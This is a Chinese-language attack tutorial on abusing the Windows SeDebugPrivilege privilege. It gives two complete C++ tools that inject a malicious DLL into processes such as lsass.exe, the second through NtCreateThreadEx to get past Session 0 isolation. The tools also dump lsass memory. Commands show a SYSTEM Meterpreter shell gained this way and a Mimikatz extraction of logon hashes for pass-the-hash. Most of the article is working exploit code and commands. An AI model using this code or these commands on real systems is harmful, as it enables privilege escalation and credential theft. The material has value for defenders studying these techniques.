SeDebugPrivilege
----------------

### 本篇文章禁止任何公众号/营销号转发

SeDebugPrivilege 特权在 Microsoft 官方文档中被描述为 “*Debug programs*”。该特权非常强大，它允许其持有者调试另一个进程，这包括读取和写入该进程的内存。许多年来，恶意软件作者和漏洞利用程序开发人员广泛滥用了这一特权。因此，许多通过这一特权获得本地特权提升的技术将被现代端点保护解决方案标记。

滥用该特权，我们可以通过 `CreateRemoteThread()` 函数实现远程线程注入，以在高权限的系统进程中加载恶意 DLL 或者 Shellcode，并最终获得本地特权提升。此外，使用该特权还可以转储 lsass.exe 进程的内存，从而获取已登录用户哈希值。这里，我们首先介绍通过远程线程注入加载恶意 DLL。

周所周知，程序在加载一个 DLL 时，它通常会调用 [`LoadLibrary()`](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) 函数来实现 DLL 的动态加载，该函数的声明如下所示。

```c++
HMODULE LoadLibraryW(
  [in] LPCWSTR lpLibFileName
);
```

再来看一下创建远程线程的 [`CreateRemoteThread()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) 函数，其用于创建在另一个进程的虚拟地址空间中运行的线程，该函数定义如下。

```c++
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
```

该函数需要传递目标进程空间中的线程函数的地址 `lpStartAddress`，以及传递给线程函数的参数 `lpParameter`，其中参数类型为空指针类型。

如果程序能够获取目标进程中 `LoadLibrary()` 函数的地址，并且能够获取进程空间中某个 DLL 路径字符串的地址，那么就可以将 `LoadLibrary()` 函数的地址作为线程函数的地址，这个 DLL 路径字符串作为传递给线程函数的参数。将二者一并传递给 `CreateRemoteThread()` 函数，在系统进程空间中创建一个线程，这个线程就是通过 `LoadLibrary()` 函数加载恶意 DLL。

到目前为止，远程线程注入的大致原理清晰了。那么要实现远程线程注入 DLL，还需要解决以下两个问题：

1. 目标进程空间中 `LoadLibrary()` 函数的地址是多少。
2. 如何向目标进程空间中写入 DLL 路径字符串数据。

对于第一个问题，由于 Windows 引入了基址随机化 ASLR（Address Space Layout Randomization）安全机制，所以每次开机时系统 DLL 的加载基址都不一样，从而导致了 DLL 导出函数的地址也都不一样。

但是，有些系统 DLL（例如 kernel32.dll、ntdll.dll）的加载基地址要求系统启动之后必须固定，如果系统重新启动，则其地址可以不同。也就是说，虽然进程不同，但是开机后，kernel32.dll 的加载基址在各个进程中都是相同的，因此导出函数的地址也相同。所以，自己程序空间中 `LoadLibrary()` 函数地址和其他进程空间中 `LoadLibrary()` 函数地址相同。因此，我们可以通过加载 kernel32.dll 模块来获取 `LoadLibrary()` 函数地址。

对于第二个问题，我们可以直接调用 `VirtualAllocEx()` 函数在目标进程空间中申请一块内存，然后再调用 `WriteProcessMemory()` 函数将指定的 DLL 路径写入到目标进程空间中。

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeDebugPrivilege 特权，然后通过上述过程滥用该特权。

- SeDebugPrivilege.cpp

```c++
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <tlhelp32.h>

DWORD GetProcessIdByName(LPCWSTR lpProcessName)
{
    // Create toolhelp snapshot.
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process;
    ZeroMemory(&process, sizeof(process));
    process.dwSize = sizeof(process);

    // Walkthrough all processes.
    if (Process32FirstW(hSnapshot, &process))
    {
        do
        {
            // Compare process.szExeFile based on format of name, i.e., trim file path
            // trim .exe if necessary, etc.
            if (_wcsicmp(process.szExeFile, lpProcessName) == 0)
            {
                wprintf(L"[*] Got the PID of %ws: %d.\n", lpProcessName, process.th32ProcessID);
                return process.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &process));
    }

    CloseHandle(hSnapshot);
    return 0;
}

BOOL ExploitSeDebugPrivilege(LPCWSTR lpProcessName, LPCWSTR lpDllFileName)
{
    BOOL status = FALSE;
    DWORD dwProcessId;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    SIZE_T dwSize = 0;
    LPVOID lpDllAddr = NULL;
    FARPROC pLoadLibraryProc = NULL;

    dwProcessId = GetProcessIdByName(lpProcessName);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == NULL)
    {
        printf("[-] OpenProcess Error: [%u].\n", GetLastError());
        return status;
    }

    // Allocate virtual memory space in a remote process.
    dwSize = (wcslen(lpDllFileName) + 1) * sizeof(WCHAR);
    lpDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
    if (lpDllAddr == NULL)
    {
        printf("[-] VirtualAllocEx Error: [%u].\n", GetLastError());
        return status;
    }
    wprintf(L"[*] Allocate virtual memory space in a %ws process: 0x%016llx\n", lpProcessName, lpDllAddr);

    // Write DLL path data to the allocated memory.
    if (!WriteProcessMemory(hProcess, lpDllAddr, lpDllFileName, dwSize, NULL))
    {
        printf("[-] WriteProcessMemory Error: [%u].\n", GetLastError());
        return status;
    }
    wprintf(L"[*] Write DLL path to the allocated memory.\n");

    // Get the LoadLibraryW function address through kernel32.dll.
    pLoadLibraryProc = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (pLoadLibraryProc == NULL)
    {
        printf("[-] GetProcAddress Error: [%u].\n", GetLastError());
        return status;
    }
    wprintf(L"[*] Get address of LoadLibraryW: 0x%016llx.\n", pLoadLibraryProc);

    // Use CreateRemoteThread to create a remote thread for DLL injection.
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryProc, lpDllAddr, 0, NULL);
    if (hThread == NULL)
    {
        printf("[-] CreateRemoteThread Error: [%u].\n", GetLastError());
        return status;
    }
    else
    {
        wprintf(L"[*] Create a remote thread for DLL injection.\n");
        status = TRUE;
    }

    WaitForSingleObject(hThread, -1);
    CloseHandle(hProcess);

    return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
    BOOL status = FALSE;
    LUID luidValue = { 0 };
    TOKEN_PRIVILEGES tokenPrivileges;

    // Get the LUID value of the privilege for the local system
    if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
    {
        wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
        return status;
    }

    // Set escalation information
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luidValue;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Elevate Process Token Access
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
    {
        wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
        return status;
    }
    else
    {
        status = TRUE;
    }
    return status;
}

void PrintUsage()
{
    wprintf(
        L"Abuse of SeDebugPrivilege by @WHOAMI (whoamianony.top)\n\n"
        L"Arguments:\n"
        L"  -h                  Show this help message and exit.\n"
        L"  -p <ProcessName>    Specifies the system process name.\n"
        L"  -m <DLL>            Specifies the malicious DLL path.\n"
    );
}

int wmain(int argc, wchar_t* argv[])
{
    HANDLE hToken = NULL;
    LPCWSTR lpProcessName = L"lsass.exe";
    LPCWSTR lpDllFileName = NULL;

    while ((argc > 1) && (argv[1][0] == '-'))
    {
        switch (argv[1][1])
        {
        case 'h':
            PrintUsage();
            return 0;
        case 'p':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                lpProcessName = (LPCWSTR)argv[1];
            }
            break;
        case 'm':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                lpDllFileName = (LPCWSTR)argv[1];
            }
            break;
        default:
            wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
            PrintUsage();
            return 0;
        }

        ++argv;
        --argc;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
        return 0;
    }
    // Enable SeDebugPrivilege for the current process token.
    if (EnableTokenPrivilege(hToken, SE_DEBUG_NAME))
    {
        if (ExploitSeDebugPrivilege(lpProcessName, lpDllFileName))
        {
            return 1;
        }
    }
}
```

将编译并生成好的 SeBackupPrivilege.exe 上传到目标主机，执行以下命令，将恶意的 DLL 注入 Administrator 用户的 notepad.exe 进程中，如下图所示，成功获得 Administrator 用户权限的 Meterpreter。

```powershell
SeDebugPrivilege.exe -p "notepad.exe" -m "C:\Users\Marcus\shell.dll"
```

![image-20230214231049280](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-f2010cfe27b856537ce798390b1b9fed5e98a221.png)

到目前为止，我们演示的远程线程注入都是使用 Windows 标准 API 进行的，其虽然易于使用，但是可被大多数 AV/EDR 产品检测到。此外，在测试中可能会发现，我们不能成功注入到一些系统服务进程。这是因为系统存在 SESSION 0 隔离的安全机制，传统的远程注入 DLL 方法并不能突破 SESSION 0 隔离。

也为了突破 SESSION 0 隔离，我们需要使用 Windows 系统中底层的 API，也就是 Native APIs。

> 为了方便与操作系统进行交互，程序员一般使用微软推荐的标准 API（Win32 API）。标准 Windows APIs 是在 Native APIs 的基础上包装产生的。Native APIs 也被称为 Undocumented APIs，因为你通常找不到它们的官方文档。Native APIs 或 Undocumented APIs 都可以在 ntdll.dll 库中调用，我们可以通过查看其他人的代码或者别人总结的非官方文档，来查看它们的使用方法。

由于 Windows 在内核 6.0 以后引入了会话隔离机制，它在创建一个进程之后并不会立即运行，而是先挂起进程，在查看要运行的进程所在的会话层之后再决定是否恢复进程运行。经过逆向分析，可以发现 `CreateRemoteThread()` 函数内部在调用了 `NtCreateThreadEx()` 函数来创建远程线程，并且 `NtCreateThreadEx()` 的第七个参数 `CreateThreadFlags` 的值被设为了 1，他会导致线程创建完成后一直挂起无法恢复运行，这就是为什么在注入系统进程时会失败。

所以，要想成功注入系统服务进程，就需要直接调用 `NtCreateThreadEx()` 函数，并将第七个参数的值改为 0，这样线程创建完成后就会恢复运行，成功注入。

如下创建一个 Native.h，将 ntdll.dll 模块加载到我们的程序中，并定义与我们要使用的原始函数格式完全相同的函数指针，使用这些函数的基地址来初始化这些指针。对于远程线程注入来说，我们需要的函数有 `NtOpenProcess()`、`NtAllocateVirtualMemory()`、`NtWriteVirtualMemory()`、`NtCreateThreadEx()`，如下所示。

- Native.h

```c++
#pragma once

#include <Windows.h>

#define STATUS_SUCCESS 0

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
}

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    PVOID UniqueProcess;
    PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef NTSTATUS(NTAPI* _NtOpenProcess)(
    PHANDLE            ProcessHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID         ClientId
    );

typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
    HANDLE             ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR          ZeroBits,
    PSIZE_T            RegionSize,
    ULONG              AllocationType,
    ULONG              Protect
    );

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
    HANDLE             hProcess,
    PVOID              lpBaseAddress,
    PVOID              lpBuffer,
    SIZE_T             NumberOfBytesToRead,
    PSIZE_T            NumberOfBytesRead
    );

typedef NTSTATUS(NTAPI* _NtCreateThreadEx) (
    PHANDLE            ThreadHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    HANDLE             ProcessHandle,
    PVOID              StartRoutine,
    PVOID              Argument OPTIONAL,
    ULONG              CreateFlags,
    ULONG_PTR          ZeroBits,
    SIZE_T             StackSize OPTIONAL,
    SIZE_T             MaximumStackSize OPTIONAL,
    PVOID              AttributeList OPTIONAL
    );

_NtOpenProcess NtOpenProcess = (_NtOpenProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtOpenProcess");
_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");
_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory");
_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");
```

此外，除了远程线程注入的方法，我们还可以使用 `MiniDumpWriteDump()` 等类似的 API 转储 lsass.exe 进程的内存，从而获取已登录用户哈希值，如下所示。

```c++
status = MiniDumpWriteDump(hProcess, dwProcessId, dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
        if (!status)
        {
            wprintf(L"[-] MiniDumpWriteDump Error: [%u].\n", GetLastError());
            return status;
        }
        wprintf(L"[*] Dump the memory of %ws process into %ws.\n", lpProcessName, outputFile);
```

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeDebugPrivilege 特权，然后通过上述两种方法滥用该特权。如果执行时 `-e` 参数为 “Injection”，则执行远程线程注入，获取权限。如果 `-e` 参数为 “Mimidump”，则可以转储指定进程的内存。

- SeDebugPrivilege.cpp

```c++
#include "Native.h"
#include <iostream>
#include <DbgHelp.h>
#include <tlhelp32.h>

#pragma comment(lib, "Dbghelp.lib")

DWORD GetProcessIdByName(LPCWSTR lpProcessName)
{
    // Create toolhelp snapshot.
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process;
    ZeroMemory(&process, sizeof(process));
    process.dwSize = sizeof(process);

    // Walkthrough all processes.
    if (Process32FirstW(hSnapshot, &process))
    {
        do
        {
            // Compare process.szExeFile based on format of name, i.e., trim file path
            // trim .exe if necessary, etc.
            if (_wcsicmp(process.szExeFile, lpProcessName) == 0)
            {
                wprintf(L"[*] Got the PID of %ws: %d.\n", lpProcessName, process.th32ProcessID);
                return process.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &process));
    }

    CloseHandle(hSnapshot);
    return 0;
}

BOOL ExploitSeDebugPrivilege(LPCWSTR expType, LPCWSTR lpProcessName, LPCWSTR lpDllFileName, LPCWSTR lpOutputFile)
{
    BOOL status = FALSE;
    DWORD dwProcessId;
    CLIENT_ID clientId = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    SIZE_T dwSize = 0;
    LPVOID lpDllAddr = NULL;
    FARPROC pLoadLibraryProc = NULL;
    HANDLE dumpFile;

    dwProcessId = GetProcessIdByName(lpProcessName);

    ZeroMemory(&clientId, sizeof(clientId));
    clientId.UniqueProcess = UlongToHandle(dwProcessId);
    clientId.UniqueThread = NULL;

    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    status = NT_SUCCESS(NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &clientId));
    if (!status)
    {
        printf("[-] NtOpenProcess Error: [%u].\n", GetLastError());
        return status;
    }
    if (!wcscmp(expType, L"Injection"))
    {
        // Allocate virtual memory space in a remote process.
        dwSize = (wcslen(lpDllFileName) + 1) * sizeof(WCHAR);
        status = NT_SUCCESS(NtAllocateVirtualMemory(hProcess, &lpDllAddr, 0, &dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE));
        if (!status)
        {
            printf("[-] NtAllocateVirtualMemory Error: [%u].\n", GetLastError());
            return status;
        }
        wprintf(L"[*] Allocate virtual memory space in a %ws process: 0x%016llx\n", lpProcessName, lpDllAddr);

        // Write DLL path data to the allocated memory.
        status = NT_SUCCESS(NtWriteVirtualMemory(hProcess, lpDllAddr, (LPVOID)lpDllFileName, dwSize, NULL));
        if (!status)
        {
            printf("[-] NtWriteVirtualMemory Error: [%u].\n", GetLastError());
            return status;
        }
        wprintf(L"[*] Write DLL path to the allocated memory.\n");

        // Get the LoadLibraryW function address through kernel32.dll.
        pLoadLibraryProc = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
        if (pLoadLibraryProc == NULL)
        {
            printf("[-] GetProcAddress Error: [%u].\n", GetLastError());
            return status;
        }
        wprintf(L"[*] Get address of LoadLibraryW: 0x%016llx.\n", pLoadLibraryProc);

        // Use CreateRemoteThread to create a remote thread for DLL injection.
        //hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryProc, lpDllAddr, 0, NULL);
        status = NT_SUCCESS(NtCreateThreadEx(&hThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pLoadLibraryProc, lpDllAddr, 0, 0, 0, 0, NULL));
        if (!status)
        {
            wprintf(L"[-] NtCreateThreadEx Error: [%u].\n", GetLastError());
            return status;
        }
        wprintf(L"[*] Create a remote thread for DLL injection.\n");

        WaitForSingleObject(hThread, -1);
        CloseHandle(hProcess);
    }
    else if (!wcscmp(expType, L"Minidump"))
    {
        dumpFile = CreateFileW(lpOutputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (dumpFile == INVALID_HANDLE_VALUE)
        {
            wprintf(L"[-] CreateFileW Error: [%u].\n", GetLastError());
            return status;
        }
        status = MiniDumpWriteDump(hProcess, dwProcessId, dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
        if (!status)
        {
            wprintf(L"[-] MiniDumpWriteDump Error: [%u].\n", GetLastError());
            return status;
        }
        wprintf(L"[*] Dump the memory of %ws process into %ws.\n", lpProcessName, lpOutputFile);
    }

    return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
    BOOL status = FALSE;
    LUID luidValue = { 0 };
    TOKEN_PRIVILEGES tokenPrivileges;

    // Get the LUID value of the privilege for the local system
    if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
    {
        wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
        return status;
    }

    // Set escalation information
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luidValue;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Elevate Process Token Access
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
    {
        wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
        return status;
    }
    else
    {
        status = TRUE;
    }
    return status;
}

void PrintUsage()
{
    wprintf(
        L"Abuse of SeDebugPrivilege by @WHOAMI (whoamianony.top)\n\n"
        L"Arguments:\n"
        L"  -h                          Show this help message and exit.\n"
        L"  -e <Injection, Minidump>    Choose the type of exploit.\n"
        L"  -p <ProcessName>            Specifies the system process name.\n"
        L"  -m <DLL>                    Specifies the malicious DLL path.\n"
        L"  -o <DLL>                    The file the process memory is dumped to.\n"
    );
}

int wmain(int argc, wchar_t* argv[])
{
    HANDLE hToken = NULL;
    LPCWSTR expType = L"Injection";
    LPCWSTR lpProcessName = L"lsass.exe";
    LPCWSTR lpDllFileName = NULL;
    LPCWSTR lpOutputFile = NULL;

    while ((argc > 1) && (argv[1][0] == '-'))
    {
        switch (argv[1][1])
        {
        case 'h':
            PrintUsage();
            return 0;
        case 'e':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                expType = (LPCWSTR)argv[1];
            }
            break;
        case 'p':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                lpProcessName = (LPCWSTR)argv[1];
            }
            break;
        case 'm':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                lpDllFileName = (LPCWSTR)argv[1];
            }
            break;
        case 'o':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                lpOutputFile = (LPCWSTR)argv[1];
            }
            break;
        default:
            wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
            PrintUsage();
            return 0;
        }

        ++argv;
        --argc;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
        return 0;
    }
    // Enable SeDebugPrivilege for the current process token.
    if (EnableTokenPrivilege(hToken, SE_DEBUG_NAME))
    {
        if (ExploitSeDebugPrivilege(expType, lpProcessName, lpDllFileName, lpOutputFile))
        {
            return 1;
        }
    }
}
```

将编译并生成好的 SeBackupPrivilege.exe 上传到目标主机，执行以下命令，将恶意的 DLL 注入到 lsass.exe 进程中，如下图所示，成功获得 SYSTEM 权限的 Meterpreter。

```powershell
SeDebugPrivilege.exe -e "Injection" -p "lsass.exe" -m "C:\Users\Marcus\shell.dll"
```

![image-20230215105701491](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-2eadc68005fe2c157924e6af6342f334a4c1d587.png)

执行以下命令，将 lsass.exe 进程的内存转储到 lsass.dmp 文件中，如下图所示。

```powershell
SeDebugPrivilege.exe -e "Minidump" -p "lsass.exe" -o ".\lsass.dmp"
```

![image-20230215151405876](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-d85d40d256ed2e0b187263bdef6dedc833ce3ea3.png)

将 lsass.dmp 下载到本地，通过 Mimikatz 离线解析并提取出已登陆的用户哈希，如下图所示。

```c++
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

![image-20230215150653195](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-f79a691a8b72eb9ce877e3b3df997be5dc81036b.png)

得到的管理员用户哈希可以用来执行哈希传递，并获取系统管理权限。